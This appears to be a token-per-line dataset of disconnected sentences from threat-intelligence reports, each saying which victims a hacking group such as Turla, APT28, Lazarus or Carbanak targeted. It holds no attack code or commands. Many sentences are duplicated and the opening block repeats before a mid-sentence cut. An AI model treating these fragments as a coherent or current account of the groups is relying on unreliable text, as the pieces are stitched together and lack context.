some
highly
sensitive
information
(
such
as
emails
sent
by
the
German
Foreign
Office
staff
)
for
almost
a
year
.
 
We
suspect
the
Kazuar
tool
may
be
linked
to
the
Turla
threat
actor
group
(
also
known
as
Uroburos
and
Snake
)
,
who
have
been
reported
to
have
compromised
embassies
,
defense
contractors
,
educational
institutions
,
and
research
organizations
across
the
globe
.
 
Deepen
told
Threatpost
the
group
has
been
operating
since
at
least
since
2008
and
has
targeted
China
and
US
relations
experts
,
Defense
Department
entities
,
and
geospatial
groups
within
the
federal
government
.
 
Government
officials
said
they
knew
the
initial
attack
occurred
in
2011
,
but
are
unaware
of
who
specifically
is
behind
the
attacks
.
 
Bahamut
was
first
noticed
when
it
targeted
a
Middle
Eastern
human
rights
activist
in
the
first
week
of
January
2017
.
 
Later
that
month
,
the
same
tactics
and
patterns
were
seen
in
attempts
against
an
Iranian
women
's
activist
an
individual
commonly
targeted
by
Iranian
actors
,
such
as
Charming
Kitten
and
the
Sima
campaign
documented
in
our
2016
Black
Hat
talk
.
 
Several
times
,
APT5
has
targeted
organizations
and
personnel
based
in
Southeast
Asia
.
 
Given
our
increased
confidence
that
Bahamut
was
responsible
for
targeting
of
Qatari
labor
rights
advocates
and
its
focus
on
the
foreign
policy
institutions
other
Gulf
states
,
Bahamut
's
interests
are
seemingly
too
expansive
to
be
limited
one
sponsor
or
customer
.
 
Barium
specializes
in
targeting
high
value
organizations
holding
sensitive
data
,
by
gathering
extensive
information
about
their
employees
through
publicly
available
information
and
social
media
,
using
that
information
to
fashion
phishing
attacks
intended
to
trickthose
employees
into
compromising
their
computers
and
networks
.
 
Barium
has
targeted
Microsoft
customers
both
in
Virginia
,
the
United
States
,
and
around
the
world
.
 
BLACKGEAR
is
an
espionage
campaign
which
has
targeted
users
in
Taiwan
for
many
years
.
 
Our
research
indicates
that
it
has
started
targeting
Japanese
users
.
 
Our
experts
have
found
that
cybercriminals
are
actively
focusing
on
SMBs
,
and
giving
particular
attention
to
accountants
.
 
Clever
Kitten
actors
have
a
strong
affinity
for
PHP
server-side
attacks
to
make
access
;
this
is
relatively
unique
amongst
targeted
attackers
who
often
favor
targeting
a
specific
individual
at
a
specific
organization
using
social
engineering
.
 
Some
of
the
exploit
server
paths
contain
modules
that
appear
to
have
been
designed
to
infect
Linux
computers
,
but
we
have
not
yet
located
the
Linux
backdoor
.
 
Confucius
targeted
a
particular
set
of
individuals
in
South
Asian
countries
,
such
as
military
personnel
and
businessmen
,
among
others
.
 
According
to
statistics
,
Corkow
primarily
targets
users
in
Russia
and
the
CIS
,
but
it
is
worth
noting
that
in
2014
the
amount
of
attacks
targeting
the
USA
increased
by
5
times
,
in
comparison
with
2011
.
 
The
threat
is
likely
targeting
employees
of
various
Palestinian
government
agencies
,
security
services
,
Palestinian
students
,
and
those
affiliated
with
the
Fatah
political
party
.
 
For
example
,
the
actors
behind
FrozenCell
used
a
spoofed
app
called
Tawjihi
2016
,
which
Jordanian
or
Palestinian
students
would
ordinarily
use
during
their
general
secondary
examination
.
 
The
titles
and
contents
of
these
files
suggest
that
the
actor
targeted
individuals
affiliated
with
these
government
agencies
and
the
Fatah
political
party
.
 
Political
entities
in
Central
Asia
have
been
targeted
throughout
2018
by
different
actors
,
including
IndigoZebra
,
Sofacy
(
with
Zebrocy
malware
)
and
most
recently
by
DustSquad
(
with
Octopus
malware
)
.
 
Targets
included
a
wide
array
of
high-profile
entities
,
including
intelligence
services
,
military
,
utility
providers
(
telecommunications
and
power
)
,
embassies
,
and
government
institutions
.
 
The
computers
of
diplomats
,
military
attachs
,
private
assistants
,
secretaries
to
Prime
Ministers
,
journalists
and
others
are
under
the
concealed
control
of
unknown
assailant
(s
)
.
 
The
banking
malware
GozNym
has
legs
;
only
a
few
weeks
after
the
hybrid
Trojan
was
discovered
,
it
has
reportedly
spread
into
Europe
and
begun
plaguing
banking
customers
in
Poland
with
redirection
attacks
.
 
We
noted
in
our
original
blog
the
large
amount
of
targeting
of
Iranian
citizens
in
this
campaign
,
we
observed
almost
one-third
of
all
victims
to
be
Iranian
.
 
Since
early
2013
,
we
have
observed
activity
from
a
unique
threat
actor
group
,
which
we
began
to
investigate
based
on
increased
activities
against
human
right
activists
in
the
beginning
of
2015
.
 
Over
the
course
of
three
years
of
observation
of
campaigns
targeting
civil
society
and
human
rights
organizations
,
from
records
of
well
over
two
hundred
spearphishing
and
other
intrusion
attempts
against
individuals
inside
of
Iran
and
in
the
diaspora
,
a
narrative
of
persistent
intrusion
efforts
emerges
.
 
Over
the
months
following
the
elections
,
the
accounts
of
Iranians
that
had
been
compromised
by
the
actors
were
then
used
for
spreading
the
malware
.
 
The
Infy
malware
was
seen
targeting
Iranians
again
in
June
2015
,
when
it
was
shared
with
researchers
after
being
sent
to
a
broadcast
journalist
at
BBC
Persian
with
a
generic
introduction
and
a
PowerPoint
presentation
attached
titled
"
Nostalogy
"
(
sic
)
.
 
One
narrowly-targeted
spearphishing
from
Infy
was
sent
from
the
compromised
account
of
a
political
activist
promoting
participation
inside
of
Iran
,
claiming
to
be
a
set
of
images
of
a
British-Iranian
dual
national
that
has
been
held
in
Evin
Prison
for
five
years
on
espionage
charges
.
 
As
in
the
past
,
these
messages
have
been
sent
accounts
believed
to
be
fake
and
accounts
compromised
by
Infy
,
including
Kurdish
activists
that
had
previously
been
compromised
by
the
Flying
Kitten
actor
group
.
 
The
Windows
10
Creators
Update
will
bring
several
enhancements
to
Windows
Defender
ATP
that
will
provide
SOC
personnel
with
options
for
immediate
mitigation
of
a
detected
threat
.
 
LEAD
and
Barium
are
not
known
for
large-scale
spear-phishing
,
so
it
is
unlikely
that
SOC
personnel
would
have
to
deal
with
multiple
machines
having
been
compromised
by
these
groups
at
the
same
time
.
 
While
the
machine
is
in
isolation
,
SOC
personnel
can
direct
the
infected
machine
to
collect
live
investigation
data
,
such
as
the
DNS
cache
or
security
event
logs
,
which
they
can
use
to
verify
alerts
,
assess
the
state
of
the
intrusion
,
and
support
follow-up
actions
.
 
The
samples
provided
were
alleged
to
be
targeting
Tibetan
and
Chinese
Pro-Democracy
Activists
.
 
They
are
often
targeted
simultaneously
with
other
ethnic
minorities
and
religious
groups
in
China
.
 
Examples
as
early
as
2008
document
malware
operations
against
Tibetan
non-governmental
organizations
(
NGOs
)
that
also
targeted
Falun
Gong
and
Uyghur
groups
.
 
Unit
42
recently
identified
a
targeted
attack
against
an
individual
working
for
the
Foreign
Ministry
of
Uzbekistan
in
China
.
 
NetTraveler
has
been
used
to
target
diplomats
,
embassies
and
government
institutions
for
over
a
decade
,
and
remains
the
tool
of
choice
by
the
adversaries
behind
these
cyber
espionage
campaigns
.
 
The
NetTraveler
group
has
infected
victims
across
multiple
establishments
in
both
the
public
and
private
sector
including
government
institutions
,
embassies
,
the
oil
and
gas
industry
,
research
centers
,
military
contractors
and
activists
.
 
The
main
point
that
sets
Operation
Groundbait
apart
from
the
other
attacks
is
that
it
has
mostly
been
targeting
anti-government
separatists
in
the
self-declared
Donetsk
and
Luhansk
People
's
Republics
.
 
Although
Silence
's
phishing
emails
were
also
sent
to
bank
employees
in
Central
and
Western
Europe
,
Africa
,
and
Asia
)
.
 
They
tried
new
techniques
to
steal
from
banking
systems
,
including
AWS
CBR
(
the
Russian
Central
Bank
's
Automated
Workstation
Client
)
,
ATMs
,
and
card
processing
.
 
However
,
some
phishing
emails
were
sent
to
bank
employees
in
more
than
25
countries
of
Central
and
Western
Europe
,
Africa
and
Asia
including
:
Kyrgyzstan
,
Armenia
,
Georgia
,
Serbia
,
Germany
,
Latvia
,
Czech
Republic
,
Romania
,
Kenya
,
Israel
,
Cyprus
,
Greece
,
Turkey
,
Taiwan
,
Malaysia
,
Switzerland
,
Vietnam
,
Austria
,
Uzbekistan
,
Great
Britain
,
Hong
Kong
,
and
others
.
 
An
interesting
point
in
the
Silence
attack
is
that
the
cybercriminals
had
already
compromised
banking
infrastructure
in
order
to
send
their
spear-phishing
emails
from
the
addresses
of
real
bank
employees
and
look
as
unsuspicious
as
possible
to
future
victims
.
 
A
preliminary
analysis
caught
the
attention
of
our
Threat
Analysis
and
Intelligence
team
as
it
yielded
interesting
data
that
,
among
other
things
,
shows
that
Silence
was
targeting
employees
from
financial
entities
,
specifically
in
the
Russian
Federation
and
the
Republic
of
Belarus
.
 
While
the
Sima
moniker
could
similarly
originate
from
software
labels
,
it
is
a
common
female
Persian
name
and
a
Persian-language
Word
for
"
visage
"
or
"
appearance
"
.
 
Given
its
use
in
more
advanced
social
engineering
campaigns
against
women
's
rights
activists
,
the
label
seem
particularly
apt
.
 
Samples
and
resource
names
contained
the
family
names
of
prominent
Iranians
,
and
several
of
these
individuals
received
the
malware
located
in
their
respective
folder
.
 
For
the
sake
of
narrative
we
are
going
to
focus
exclusively
to
those
samples
we
identified
being
used
in
attacks
against
Iranian
civil
society
and
diaspora
.
 
After
reviewing
all
the
malware
functionalities
,
we
are
confident
in
saying
that
the
attackers
look
for
victims
who
answer
well-defined
characteristics
and
believe
that
further
stages
of
the
attack
are
delivered
only
to
those
who
fit
the
specific
victim
profile
.
 
It's
coincident
that
both
'darkhydrus'
APT
group
name
and
Williams
user
name
in
PDB
path
found
in
this
Twitter
user
.
 
The
360
Intelligence
Center
observed
four
distinct
campaigns
against
Pakistan
since
2017
(link)
,
recently
targeting
Pakistani
businessmen
working
in
China
.
 
In
the
latest
attack
,
Donot
group
is
targeting
Pakistani
businessman
working
in
China
A
previous
,
removed
,
report
from
another
vendor
claimed
non-specific
information
about
the
groups'
interest
in
Chinese
universities
,
but
that
report
has
been
removed
most
likely
detections
were
related
to
students
and
researchers
scanning
known
collected
samples
and
any
incidents
remain
unconfirmed
and
unknown
.
 
The
most
popular
targets
of
SneakyPastes
are
embassies
,
government
entities
,
education
,
media
outlets
,
journalists
,
activists
,
political
parties
or
personnel
,
healthcare
and
banking
.
 
Through
our
continuous
monitoring
of
threats
during
2018
,
we
observed
a
new
wave
of
attacks
by
Gaza
Cybergang
Group1
targeting
embassies
and
political
personnel
.
 
This
could
include
diplomats
,
experts
in
the
LOCs
of
interest
related
to
the
Digital
Economy
Task
Force
,
or
possibly
even
journalists
.
 
This
focus
on
training
aligns
with
LYCEUMs
targeting
of
executives
,
HR
staff
,
and
IT
personnel
.
 
Despite
the
initial
perception
that
the
maldoc
sample
was
intended
for
ICS
or
OT
staff
,
LYCEUM
has
not
demonstrated
an
interest
in
those
environments
.
 
The
threat
actors
emails
usually
contain
a
picture
or
a
link
without
a
malicious
payload
and
are
sent
out
to
a
huge
recipient
database
of
up
to
85
,
000
users
.
 
Group-IB
specialists
determined
that
the
email
addresses
of
IT
bank
employees
were
among
the
recipients
of
these
emails
.
 
While
OceanLotus
targets
are
global
,
their
operations
are
mostly
active
within
the
APAC
region
which
encompasses
targeting
private
sectors
across
multiple
industries
,
foreign
governments
,
activists
,
and
dissidents
connected
to
Vietnam
.
 
The
attackers
sent
multiple
emails
containing
macro-enabled
XLS
files
to
employees
working
in
the
banking
sector
in
the
Middle
East
.
 
Examples
as
early
as
2008
document
malware
operations
against
Tibetan
non-governmental
organizations
(
NGOs
)
that
also
targeted
Falun
Gong
and
Uyghur
groups
.
 
Based
on
this
,
we
believe
the
Rancor
attackers
were
targeting
political
entities
.
 
Other
groups
,
such
as
Buhtrap
,
Corkow
and
Carbanak
,
were
already
known
to
target
and
successfully
steal
money
from
financial
institutions
and
their
customers
in
Russia
.
 
Since
last
week
,
iSIGHT
Partners
has
worked
to
provide
details
on
the
power
outage
in
Ukraine
to
our
global
customers
.
 
The
attacks
we
attribute
to
Scarlet
Mimic
have
primarily
targeted
Uyghur
and
Tibetan
activists
as
well
as
those
who
are
interested
in
their
causes
.
 
The
most
recent
Scarlet
Mimic
attacks
we
have
identified
were
conducted
in
2015
and
suggest
the
group
has
a
significant
interest
in
both
Muslim
activists
and
those
interested
in
critiques
of
the
Russian
government
and
Russian
President
Vladimir
Putin
.
 
Based
on
analysis
of
the
data
and
malware
samples
we
have
collected
,
Unit
42
believes
the
attacks
described
herein
are
the
work
of
a
group
or
set
of
cooperating
groups
who
have
a
single
mission
,
collecting
information
on
minority
groups
who
reside
in
and
around
northwestern
China
.
 
In
the
past
,
Scarlet
Mimic
has
primarily
targeted
individuals
who
belong
to
these
minority
groups
as
well
as
their
supporters
,
but
we've
recently
found
evidence
to
indicate
the
group
also
targets
individuals
working
inside
government
anti-terrorist
organizations
.
 
Our
investigation
showed
that
these
attacks
were
targeted
,
and
that
the
threat
actor
sought
to
steal
communications
data
of
specific
individuals
in
various
countries
.
 
CapabilitiesFormBook
is
a
data
stealer
,
but
not
a
full-fledged
banker
.
 
While
discussions
of
threats
in
this
region
often
focus
on
"
North
America
"
generally
or
just
the
United
States
,
nearly
100
campaigns
during
this
period
were
either
specifically
targeted
at
Canadian
organizations
or
were
customized
for
Canadian
audiences
.
 
In
all
emails
sent
to
these
government
officials
,
the
actor
used
the
same
attachment
:
a
malicious
Microsoft
Word
document
that
exploited
the
CVE-2012-0158
vulnerability
to
drop
a
malicious
payload
.
 
In
this
latest
incident
,
the
group
registered
a
fake
news
domain
,
timesofindiaa.in
,
on
May
18
,
2016
,
and
then
used
it
to
send
spear
phishing
emails
to
Indian
government
officials
on
the
same
day
.
 
The
first
time
this
happened
was
at
the
beginning
of
the
month
,
when
Proofpoint
researchers
blew
the
lid
off
a
cyber-espionage
campaign
named
Operation
Transparent
Tribe
,
which
targeted
the
Indian
embassies
in
Saudi
Arabia
and
Kazakhstan
.
 
Back
in
February
2016
,
Indian
army
officials
issued
a
warning
against
the
usage
of
three
apps
,
WeChat
,
SmeshApp
,
and
Line
,
fearing
that
these
apps
collected
too
much
information
if
installed
on
smartphones
used
by
Indian
army
personnel
.
 
According
to
the
security
firm
,
this
campaign
targeted
Indian
military
officials
via
spear-phishing
emails
,
distributing
spyware
to
its
victims
via
an
Adobe
Reader
vulnerability
.
 
In
addition
to
these
,
the
Animal
Farm
attackers
used
at
least
one
unknown
,
mysterious
malware
during
an
operation
targeting
computer
users
in
Burkina
Faso
.
 
PLATINUM
's
persistent
use
of
spear
phishing
tactics
(
phishing
attempts
aimed
at
specific
individuals
)
and
access
to
previously
undiscovered
zero-day
exploits
have
made
it
a
highly
resilient
threat
.
 
The
group
's
persistent
use
of
spear
phishing
tactics
(
phishing
attempts
aimed
at
specific
individuals
)
and
access
to
previously
undiscovered
zero-day
exploits
have
made
it
a
highly
resilient
threat
.
 
Researching
this
attack
and
the
malware
used
therein
led
Microsoft
to
discover
other
instances
of
PLATINUM
attacking
users
in
India
around
August
2015
.
 
The
Poseidon
Group
actively
targets
this
sort
of
corporate
environment
for
the
theft
of
intellectual
property
and
commercial
information
,
occasionally
focusing
on
personal
information
on
executives
.
 
The
previous
two
volumes
of
the
Microsoft
Security
Intelligence
Report
explored
the
activities
of
two
such
groups
,
code-named
STRONTIUM
and
PLATINUM
,
which
used
previously
unknown
vulnerabilities
and
aggressive
,
persistent
techniques
to
target
specific
individuals
and
institutions
often
including
military
installations
,
intelligence
agencies
,
and
other
government
bodies
.
 
Mark
Zuckerberg
,
Jack
Dorsey
,
Sundar
Pichai
,
and
Daniel
Ek
the
CEOs
of
Facebook
,
Twitter
,
Google
and
Spotify
,
respectively
have
also
fallen
victim
to
the
hackers
,
dispelling
the
notion
that
a
career
in
software
and
technology
exempts
one
from
being
compromised
.
 
The
group
is
well
known
:
They
hijacked
WikiLeaks'
DNS
last
month
shortly
after
they
took
over
HBO
's
Twitter
account
;
last
year
,
they
took
over
Mark
Zuckerberg
's
Twitter
and
Pinterest
accounts
;
and
they
hit
both
BuzzFeed
and
TechCrunch
not
long
after
that
.
 
OurMine
is
well
known
:
They
hijacked
WikiLeaks'
DNS
last
month
shortly
after
they
took
over
HBO
's
Twitter
account
;
last
year
,
they
took
over
Mark
Zuckerberg
's
Twitter
and
Pinterest
accounts
;
and
they
hit
both
BuzzFeed
and
TechCrunch
not
long
after
that
.
 
Probably
the
most
high-profile
attack
that
GandCrab
was
behind
is
a
series
of
infections
at
customers
of
remote
IT
support
firms
in
the
month
of
February
.
 
Further
tracking
of
the
Lazaruss
activities
has
enabled
Kaspersky
researchers
to
discover
a
new
operation
,
active
since
at
least
November
2018
,
which
utilizes
PowerShell
to
control
Windows
systems
and
Mac
OS
malware
to
target
Apple
customers
.
 
Users
who
failed
to
patch
their
systems
may
find
themselves
mining
cryptocurrency
for
threat
actors
.
 
Keeping
in
mind
the
sensitivity
of
passwords
,
GoCrack
includes
an
entitlement-based
system
that
prevents
users
from
accessing
task
data
unless
they
are
the
original
creator
or
they
grant
additional
users
to
the
task
.
 
The
threat
actors
emails
usually
contain
a
picture
or
a
link
without
a
malicious
payload
and
are
sent
out
to
a
huge
recipient
database
of
up
to
85
,
000
users
.
 
The
admin@338
previous
activities
against
financial
and
policy
organizations
have
largely
focused
on
spear
phishing
emails
written
in
English
,
destined
for
Western
audiences
.
 
This
week
the
experts
at
FireEye
discovered
that
a
group
of
Chinese-based
hackers
called
admin@338
had
sent
multiple
MH370-themed
spear
phishing
emails
,
the
attackers
targeted
government
officials
in
Asia-Pacific
,
it
is
likely
for
cyber
espionage
purpose
.
 
The
attackers
used
the
popular
Poison
Ivy
RAT
and
WinHTTPHelper
malware
to
compromise
the
computers
of
government
officials
.
 
The
admin@338
used
the
popular
Poison
Ivy
RAT
and
WinHTTPHelper
malware
to
compromise
the
computers
of
government
officials
.
 
The
group
previous
activities
against
financial
and
policy
organizations
have
largely
focused
on
spear
phishing
emails
written
in
English
,
destined
for
Western
audiences
.
 
The
targets
were
similar
to
a
2015
TG-4127
campaign
individuals
in
Russia
and
the
former
Soviet
states
,
current
and
former
military
and
government
personnel
in
the
U.S.
and
Europe
,
individuals
working
in
the
defense
and
government
supply
chain
,
and
authors
and
journalists
but
also
included
email
accounts
linked
to
the
November
2016
United
States
presidential
election
.
 
APT28
espionage
activity
has
primarily
targeted
entities
in
the
U.S.
,
Europe
,
and
the
countries
of
the
former
Soviet
Union
,
including
governments
,
militaries
,
defense
attaches
,
media
entities
,
and
dissidents
and
figures
opposed
to
the
current
Russian
government
.
 
APT28
espionage
activity
has
primarily
targeted
entities
in
the
U.S.
,
Europe
,
and
the
countries
of
the
former
Soviet
Union
,
including
governments
and
militaries
,
defense
attaches
,
media
entities
,
and
dissidents
and
figures
opposed
to
the
current
Russian
government
.
 
APT28
targets
Russian
rockers
and
dissidents
Pussy
Riot
via
spear-phishing
emails
.
 
We
have
reasons
to
believe
that
the
operators
of
the
APT28
network
are
either
Russian
citizens
or
citizens
of
a
neighboring
country
that
speak
Russian
.
 
Russian
citizensjournalists
,
software
developers
,
politicians
,
researchers
at
universities
,
and
artists
are
also
targeted
by
Pawn
Storm
.
 
In
addition
to
focused
targeting
of
the
private
sector
with
ties
to
Vietnam
,
APT32
has
also
targeted
foreign
governments
,
as
well
as
Vietnamese
dissidents
and
journalists
since
at
least
2013
.
 
In
2014
,
APT32
leveraged
a
spear-phishing
attachment
titled
"
Plans
to
crackdown
on
protesters
at
the
Embassy
of
Vietnam.exe
,
"
which
targeted
dissident
activity
among
the
Vietnamese
diaspora
in
Southeast
Asia
.
 
In
2017
,
social
engineering
content
in
lures
used
by
the
actor
provided
evidence
that
they
were
likely
used
to
target
members
of
the
Vietnam
diaspora
in
Australia
as
well
as
government
employees
in
the
Philippines
.
 
APT33
sent
spear
phishing
emails
to
employees
whose
jobs
related
to
the
aviation
industry
.
 
APT37
targeted
a
research
fellow
,
advisory
member
,
and
journalist
associated
with
different
North
Korean
human
rights
issues
and
strategic
organizations
.
 
The
majority
of
APT37
activity
continues
to
target
South
Korea
,
North
Korean
defectors
,
and
organizations
and
individuals
involved
in
Korean
Peninsula
reunification
efforts
.
 
In
May
2017
,
APT37
used
a
bank
liquidation
letter
as
a
spear
phishing
lure
against
a
board
member
of
a
Middle
Eastern
financial
company
.
 
Per
the
complaint
,
the
email
account
watsonhenny@gmail.com
was
used
to
send
LinkedIn
invitations
to
employees
of
a
bank
later
targeted
by
APT38
.
 
The
APT38
uses
DYEPACK
to
manipulate
the
SWIFT
transaction
records
and
hide
evidence
of
the
malicious
transactions
,
so
bank
personnel
are
none
the
wiser
when
they
review
recent
transactions
.
 
APT39
's
focus
on
the
telecommunications
and
travel
industries
suggests
intent
to
perform
monitoring
,
tracking
,
or
surveillance
operations
against
specific
individuals
,
collect
proprietary
or
customer
data
for
commercial
or
operational
purposes
that
serve
strategic
requirements
related
to
national
priorities
,
or
create
additional
accesses
and
vectors
to
facilitate
future
campaigns
.
 
Other
groups
attributed
to
Iranian
attackers
,
such
as
Rocket
Kitten
,
have
targeted
Iranian
individuals
in
the
past
,
including
anonymous
proxy
users
,
researchers
,
journalists
,
and
dissidents
.
 
We
believe
that
the
Carbanak
campaign
is
a
clear
indicator
of
a
new
era
in
cybercrime
in
which
criminals
use
APT
techniques
directly
against
the
financial
industry
instead
of
through
its
customers
.
 
Carbanak
has
its
origin
in
more
common
financial
fraud
including
theft
from
consumer
and
corporate
bank
accounts
in
Europe
and
Russia
,
using
standard
banking
malware
,
mainly
Carberp
.
 
The
group
has
its
origin
in
more
common
financial
fraud
including
theft
from
consumer
and
corporate
bank
accounts
in
Europe
and
Russia
,
using
standard
banking
malware
,
mainly
Carberp
.
 
Gallmaker
's
targets
are
embassies
of
an
Eastern
European
country
.
 
However
,
in
September
last
year
,
our
friends
at
CSIS
published
a
blog
detailing
a
new
Carbanak
variant
affecting
one
of
its
customers
.
 
360
and
Tuisec
already
identified
some
Gorgon
Group
members
.
 
Symantec
also
confirmed
seeing
the
Lazarus
wiper
tool
in
Poland
at
one
of
their
customers
.
 
This
new
campaign
,
dubbed
HaoBao
,
resumes
Lazarus
'
previous
phishing
emails
,
posed
as
employee
recruitment
,
but
now
targets
Bitcoin
users
and
global
financial
organizations
.
 
Beginning
in
2017
,
the
Lazarus
group
heavily
targeted
individuals
with
spear
phishing
emails
impersonating
job
recruiters
which
contained
malicious
documents
.
 
We
concluded
that
Lazarus
Group
was
responsible
for
WannaCry
,
a
destructive
attack
in
May
that
targeted
Microsoft
customers
.
 
The
targeting
of
this
individual
suggests
the
actors
are
interested
in
breaching
the
French
Ministry
of
Foreign
Affairs
itself
or
gaining
insights
into
relations
between
France
and
Taiwan
.
 
On
November
10
,
2015
,
threat
actors
sent
a
spear-phishing
email
to
an
individual
at
the
French
Ministry
of
Foreign
Affairs
.
 
On
November
10
,
2015
,
Lotus
Blossom
sent
a
spear-phishing
email
to
an
individual
at
the
French
Ministry
of
Foreign
Affairs
.
 
APT
threat
actors
,
most
likely
nation
state-sponsored
,
targeted
a
diplomat
in
the
French
Ministry
of
Foreign
Affairs
with
a
seemingly
legitimate
invitation
to
a
technology
conference
in
Taiwan
.
 
Additionally
,
the
targeting
of
a
French
diplomat
based
in
Taipei
,
Taiwan
aligns
with
previous
targeting
by
these
actors
,
as
does
the
separate
infrastructure
.
 
Since
at
least
2014
,
APT32
,
also
known
as
the
OceanLotus
Group
,
has
targeted
foreign
corporations
with
investments
in
Vietnam
,
foreign
governments
,
journalists
,
and
Vietnamese
dissidents
.
 
APT35
typically
targets
U.S.
and
the
Middle
Eastern
military
,
diplomatic
and
government
personnel
,
organizations
in
the
media
,
energy
and
defense
industrial
base
(
DIB
)
,
and
engineering
,
business
services
and
telecommunications
sectors
.
 
COBALT
GYPSY
has
used
spearphishing
to
target
telecommunications
,
government
,
defense
,
oil
,
and
financial
services
organizations
based
in
or
affiliated
with
the
MENA
region
,
identifying
individual
victims
through
social
media
sites
.
 
The
Magic
Hound
has
repeatedly
used
social
media
to
identify
and
interact
with
employees
at
targeted
organizations
and
then
used
weaponized
Excel
documents
.
 
The
May
2014
'
Operation
Saffron
Rose
'
publication
identifies
an
Iranian
hacking
group
formerly
named
'
Ajax
Security
'
(
code-named
'
Flying
Kitten
'
by
CrowdStrike
)
engaged
in
active
spear
phishing
attacks
on
Iranian
dissidents
(
those
attempting
to
circumvent
government
traffic
monitoring
)
.
 
An
Iranian
hacking
group
formerly
named
Ajax
Security
(
code-named
'
Flying
Kitten
'
by
CrowdStrike
)
engaged
in
active
spear
phishing
attacks
on
Iranian
dissidents
(
those
attempting
to
circumvent
government
traffic
monitoring
)
.
 
PIVY
also
played
a
key
role
in
the
2011
campaign
known
as
Nitro
that
targeted
chemical
makers
,
government
agencies
,
defense
contractors
,
and
human
rights
groups.10,11
Still
active
a
year
later
,
the
Nitro
attackers
used
a
zero-day
vulnerability
in
Java
to
deploy
PIVY
in
2012
.
 
APT10
is
known
to
have
exfiltrated
a
high
volume
of
data
from
multiple
victims
,
exploiting
compromised
MSP
networks
,
and
those
of
their
customers
,
to
stealthily
move
this
data
around
the
world
.
 
Targeted
sectors
of
Molerats
include
governmental
and
diplomatic
institutions
,
including
embassies
;
companies
from
the
aerospace
and
defence
Industries
;
financial
institutions
;
journalists
;
software
developers
.
 
It
was
during
operator
X
's
network
monitoring
that
the
attackers
placed
Naikon
proxies
within
the
countries
'
borders
,
to
cloak
and
support
real-time
outbound
connections
and
data
Exfiltration
from
high-profile
victim
organizations
.
 
In
early
May
2016
,
both
PROMETHIUM
and
NEODYMIUM
started
conducting
attack
campaigns
against
specific
individuals
in
Europe
.
 
Although
most
malware
today
either
seeks
monetary
gain
or
conducts
espionage
for
economic
advantage
,
both
of
these
activity
groups
appear
to
seek
information
about
specific
individuals
.
 
Attackers
using
several
locations
in
China
have
leveraged
C&C
servers
on
purchased
hosted
services
in
the
United
States
and
compromised
servers
in
the
Netherlands
to
wage
attacks
against
global
oil
,
gas
,
and
petrochemical
companies
,
as
well
as
individuals
and
executives
in
Kazakhstan
,
Taiwan
,
Greece
,
and
the
United
States
to
acquire
proprietary
and
highly
confidential
information
.
 
Attackers
using
several
locations
in
China
have
leveraged
C&C
servers
on
purchased
hosted
services
in
the
United
States
and
compromised
servers
in
the
Netherlands
to
wage
attacks
against
global
oil
,
gas
,
and
petrochemical
companies
,
as
well
as
individuals
and
executives
in
Kazakhstan
,
Taiwan
,
Greece
,
and
the
United
States
to
acquire
proprietary
and
highly
confidential
information
.
 
Additionally
,
HELIX
KITTEN
actors
have
shown
an
affinity
for
creating
thoroughly
researched
and
structured
spear-phishing
messages
relevant
to
the
interests
of
targeted
personnel
.
 
The
attackers
sent
multiple
emails
containing
macro-enabled
XLS
files
to
employees
working
in
the
banking
sector
in
the
Middle
East
.
 
In
late
2015
,
Symantec
identified
suspicious
activity
involving
a
hacking
tool
used
in
a
malicious
manner
against
one
of
our
customers
.
 
The
SWC
of
a
Uyghur
cultural
website
suggests
intent
to
target
the
Uyghur
ethnic
group
,
a
Muslim
minority
group
primarily
found
in
the
Xinjiang
region
of
China
.
 
It's
possible
TG-3390
used
a
waterhole
to
infect
data
center
employees
.
 
The
initial
attack
vector
used
in
the
attack
against
the
data
center
is
unclear
,
but
researchers
believe
LuckyMouse
possibly
had
conducted
watering
hole
or
phishing
attacks
to
compromise
accounts
belonging
to
employees
at
the
national
data
center
.
 
The
group
,
believed
to
be
based
in
China
,
has
also
targeted
defense
contractors
,
colleges
and
universities
,
law
firms
,
and
political
organizations
including
organizations
related
to
Chinese
minority
ethnic
groups
.
 
In
all
cases
,
based
on
the
nature
of
the
computers
infected
by
Thrip
,
it
appeared
that
the
telecoms
companies
themselves
and
not
their
customers
were
the
targets
of
these
attacks
.
 
Turla
is
a
notorious
group
that
has
been
targeting
government
officials
.
 
Turla
is
a
notorious
group
that
has
been
targeting
diplomats
.
 
The
attackers
behind
Epic
Turla
have
infected
several
hundred
computers
in
more
than
45
countries
,
including
embassies
.
 
From
February
to
September
2016
,
WhiteBear
activity
was
narrowly
focused
on
embassies
and
consular
operations
around
the
world
.
 
All
of
these
early
WhiteBear
targets
were
related
to
embassies
and
diplomatic/foreign
affair
organizations
.
 
Thus
,
Turla
operators
had
access
to
some
highly
sensitive
information
(
such
as
emails
sent
by
the
German
Foreign
Office
staff
)
for
almost
a
year
.
 
We
suspect
the
Kazuar
tool
may
be
linked
to
the
Turla
threat
actor
group
(
also
known
as
Uroburos
and
Snake
)
,
who
have
been
reported
to
have
compromised
embassies
,
defense
contractors
,
educational
institutions
,
and
research
organizations
across
the
globe
.
 
Deepen
told
Threatpost
the
group
has
been
operating
since
at
least
since
2008
and
has
targeted
China
and
US
relations
experts
,
Defense
Department
entities
,
and
geospatial
groups
within
the
federal
government
.
 
Government
officials
said
they
knew
the
initial
attack
occurred
in
2011
,
but
are
unaware
of
who
specifically
is
behind
the
attacks
.
 
Bahamut
was
first
noticed
when
it
targeted
a
Middle
Eastern
human
rights
activist
in
the
first
week
of
January
2017
.
 
Later
that
month
,
the
same
tactics
and
patterns
were
seen
in
attempts
against
an
Iranian
women
's
activist
an
individual
commonly
targeted
by
Iranian
actors
,
such
as
Charming
Kitten
and
the
Sima
campaign
documented
in
our
2016
Black
Hat
talk
.
 
Several
times
,
APT5
has
targeted
organizations
and
personnel
based
in
Southeast
Asia
.
 
Given
our
increased
confidence
that
Bahamut
was
responsible
for
targeting
of
Qatari
labor
rights
advocates
and
its
focus
on
the
foreign
policy
institutions
other
Gulf
states
,
Bahamut
's
interests
are
seemingly
too
expansive
to
be
limited
one
sponsor
or
customer
.
 
Barium
specializes
in
targeting
high
value
organizations
holding
sensitive
data
,
by
gathering
extensive
information
about
their
employees
through
publicly
available
information
and
social
media
,
using
that
information
to
fashion
phishing
attacks
intended
to
trickthose
employees
into
compromising
their
computers
and
networks
.
 
Barium
has
targeted
Microsoft
customers
both
in
Virginia
,
the
United
States
,
and
around
the
world
.
 
BLACKGEAR
is
an
espionage
campaign
which
has
targeted
users
in
Taiwan
for
many
years
.
 
Our
research
indicates
that
it
has
started
targeting
Japanese
users
.
 
Our
experts
have
